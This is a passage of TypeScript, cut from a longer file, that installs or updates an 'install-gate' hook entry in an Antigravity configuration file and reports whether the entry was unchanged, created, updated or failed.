  const kitHook = groups.flatMap((g) => g.hooks ?? []).find((h) => isKitGateCommand(h.command));
  if (!migrated && current?.enabled !== false && kitHook?.command === desired) {
    return { file, action: "unchanged", detail: "install-gate already wired" };
  }
  config[ANTIGRAVITY_HOOK_NAME] = withKitAntigravityGate(current, groups, kitHook, desired);
  try {
    await mkdir(dirname(path), { recursive: true });
    await writeFile(path, JSON.stringify(config, null, 2) + "\n", "utf-8");
    return { file, action: existed ? "updated" : "created" };
  } catch (err) {
    return { file, action: "failed", detail: err instanceof Error ? err.message : String(err) };
  }
}
